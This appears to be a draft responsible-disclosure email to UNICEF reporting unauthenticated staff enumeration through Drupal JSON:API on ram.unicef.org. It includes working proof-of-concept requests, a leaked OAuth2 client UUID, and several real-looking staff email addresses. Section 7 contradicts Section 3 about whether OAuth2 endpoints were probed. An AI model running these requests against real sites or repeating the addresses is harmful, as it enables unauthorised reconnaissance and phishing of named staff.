# F001 — Ready-to-Send Email Report
# Send to: infosecurity@unicef.org
# Subject: Vulnerability Report: Unauthenticated User Enumeration via Drupal JSON:API on ram.unicef.org
#
# UPDATE PLACEHOLDERS before sending:
#   [TOTAL_USER_COUNT] → from poc-user-count.txt
#   [OAUTH2_STATUS]    → HTTP status from poc-oauth2-client.txt
#   If OAuth2 returns credentials: add Section 4b and upgrade severity to High
# -------------------------------------------------------------------------------

---

**To:** infosecurity@unicef.org  
**Subject:** Vulnerability Report: Unauthenticated User Enumeration via Drupal JSON:API on ram.unicef.org

---

Dear UNICEF Information Security Team,

I am writing to report a vulnerability discovered during authorized security research on
the UNICEF responsible vulnerability disclosure scope (`*.unicef.org`). This report is
submitted in accordance with UNICEF's responsible disclosure policy.

**Researcher:** zahinshahriar3@gmail.com  
**Discovery Date:** 2026-06-17  
**Severity:** Medium (CVSS 3.1 Base Score: 5.3) — potential High if OAuth2 endpoints
confirmed (see Section 4)

---

## 1. Vulnerability Summary

The UNICEF RAM 3.0 platform (`ram.unicef.org`) has the Drupal 8 JSON:API module
configured without authentication controls. Any unauthenticated HTTP request to the
`/en/jsonapi/user/user` endpoint returns a paginated list of UNICEF staff user accounts,
including real `@unicef.org` email addresses and internal user UUIDs.

**Endpoint:** `https://ram.unicef.org/en/jsonapi/user/user`  
**Authentication required:** None  
**HTTP status:** 200 OK  
**Data returned:** Staff email addresses, display names, user UUIDs, account metadata

---

## 2. Proof of Concept

No special tools or accounts are required. The following single HTTP request reproduces
the issue:

```
GET /en/jsonapi/user/user HTTP/1.1
Host: ram.unicef.org
Accept: application/vnd.api+json
```

**Response (HTTP 200):**
```json
{
  "jsonapi": {"version": "1.0"},
  "data": [
    {
      "type": "user--user",
      "id": "<uuid>",
      "attributes": {
        "display_name": "<staff name>",
        "name": "<username>",
        "mail": "fmelese@unicef.org"
      }
    },
    {
      "attributes": { "mail": "yara@unicef.org" }
    },
    {
      "attributes": { "mail": "apopa@unicef.org" }
    },
    {
      "attributes": { "mail": "fawde@unicef.org" }
    }
    ... [TOTAL_USER_COUNT] users total
  ]
}
```

I limited enumeration to the first page of results to avoid unnecessary collection of
staff PII. I am not retaining the full user list.

---

## 3. Additional Exposure Surface

The JSON:API schema endpoint (`/en/jsonapi`) is also publicly accessible and exposes
60+ internal entity types without authentication, including:

- `oauth2_server_client` — OAuth2 API clients registered on the platform
- `oauth2_server_token` — OAuth2 bearer tokens
- `oauth2_server_scope` — OAuth2 scopes
- `consumer--consumer` — API consumer configurations
- `config_pages--api_config` — API configuration pages
- `config_pages--api_modules` — API module configuration
- `node--documents` — Internal documents

**OAuth2 Client UUID Disclosure (confirmed):** When probing
`/en/jsonapi/oauth2_server_client/oauth2_server_client` unauthenticated, the server
returns HTTP 200 with `data: []` but Drupal's partial-result mechanism leaks the
internal UUID of each OAuth2 client in the `meta.omitted` links section. Confirmed
leaked OAuth2 client UUID: `8cf614c1-7422-477b-952b-bcf1642439c5`.

```
GET /en/jsonapi/oauth2_server_client/oauth2_server_client HTTP/1.1
Host: ram.unicef.org
Accept: application/vnd.api+json

HTTP/1.1 200 OK

{
  "data": [],
  "meta": {
    "omitted": {
      "detail": "Some resources have been omitted because of insufficient authorization.",
      "links": {
        "item--5PGyAhH": {
          "href": "http://ram.unicef.org/en/jsonapi/oauth2_server_client/oauth2_server_client/8cf614c1-7422-477b-952b-bcf1642439c5"
        }
      }
    }
  }
}
```

Client secrets are not returned, but the UUIDs of all registered OAuth2 clients are
disclosed. I did not probe the OAuth2 token endpoint beyond confirming its presence in
the schema. The platform team should audit all entity endpoints for similar omission-based
UUID leakage.

---

## 4. Platform Context (Amplifies Risk)

The RAM 3.0 platform is running a fully end-of-life software stack:

| Component | Installed Version | EOL Date |
|---|---|---|
| Drupal | 8.x | November 2021 |
| PHP | 7.4.33 | December 2022 |
| Apache | 2.4.54 | Superseded |

None of these components receive security patches. The combination of an unpatched CMS
with an exposed JSON:API increases the attack surface significantly.

---

## 5. Impact

1. **Staff PII disclosure:** `@unicef.org` email addresses of RAM platform users are
   accessible to any unauthenticated actor on the internet. This enables targeted
   spear-phishing attacks against UNICEF personnel.

2. **Account enumeration:** User UUIDs and display names are also returned. This
   provides an attacker with a validated set of internal user identifiers.

3. **Credential attack enablement:** A confirmed list of valid UNICEF email addresses
   obtained from an official `ram.unicef.org` domain can be used in credential stuffing
   attacks against UNICEF's SSO, email, VPN, or other authentication portals.

4. **Potential OAuth2 exposure:** The schema indicates OAuth2 server entity types are
   exposed. If the `oauth2_server_client` endpoint returns client credentials, severity
   escalates to High (CVSS 7.5).

---

## 6. Recommended Remediation

**Immediate:**

Apply authentication requirement to all JSON:API routes. The fastest fix is to add
access control in Drupal's `services.yml` or via the `jsonapi_access` contributed module:

```bash
drush en jsonapi_access -y
drush config-set jsonapi_access.settings require_auth 1 -y
drush cr
```

Alternatively, restrict the `user--user` resource specifically by disabling it in
`jsonapi.resource_types` configuration.

**Short-term:**

- Migrate from Drupal 8 (EOL) to Drupal 10 or 11
- Upgrade PHP to 8.2+
- Review all 60+ JSON:API entity endpoints for additional unintended exposure
- Specifically audit: `oauth2_server_client`, `oauth2_server_token`, `config_pages/api_config`

**Reference:**  
Drupal JSON:API security hardening: https://www.drupal.org/docs/core-modules-and-themes/core-modules/jsonapi-module/security

---

## 7. Researcher Notes

- I am not affiliated with any threat actor or competing organization.
- I stopped enumeration after confirming the vulnerability with a minimal sample (4 email
  addresses) and did not collect, store, or transmit the full user list.
- I did not attempt to authenticate to any UNICEF system using the exposed credentials.
- I did not test any OAuth2 or API endpoints beyond confirming their presence in the schema.
- Disclosure timeline: I am reporting immediately upon confirmation (same day).

I would be glad to provide any additional technical details or assist with verification.
If UNICEF wishes to acknowledge this finding, I'd appreciate credit in your Hall of Fame.

Best regards,  
zahinshahriar3@gmail.com
